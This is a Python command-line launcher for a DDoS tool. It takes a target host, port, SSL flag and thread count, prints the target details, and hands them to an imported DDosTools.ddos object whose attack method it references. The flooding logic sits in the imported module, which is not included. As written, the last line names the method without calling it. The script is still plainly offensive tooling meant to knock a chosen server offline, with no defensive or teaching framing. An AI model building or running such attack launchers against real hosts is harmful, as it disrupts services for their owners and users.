import DDosTools
import argparse
from sys import argv

RED, GOLD, RESET = '\x1b[91m', '\x1b[93m', '\x1b[0m'

parser = argparse.ArgumentParser(description=DDosTools.Document())
parser.add_argument('--host', help='Specify the domain name or IP address of the host.')
parser.add_argument('--port', help='Specify the port number of the host.', type=int)
parser.add_argument('--ssl',  help='Enable/Disable SSL socket? (default: False)', default='False')
parser.add_argument('--num',  help='Number of threads used during execution. (default: 32)', type=int, default=32)
args = parser.parse_args()
if not args.host or not args.port:
    exit(f'{RED}[Err]{RESET}\n    Usage: {GOLD}python {argv[0]} --help{RESET}')
args.ssl = DDosTools.CheckSSLMode(args.ssl)

print(
    f'>>>> Information of the target.\n'
    f'>>>> Host: {args.host}\n'
    f'>>>> Port: {args.port}\n'
    f'>>>> SSL:  {args.ssl}\n'
    f'>>>> The number of threads used is {args.num}.'
)

ddos = DDosTools.ddos(
    hostname = args.host,
    port     = args.port,
    SSL_Mode = args.ssl,
    NOT      = args.num
)
ddos.attack




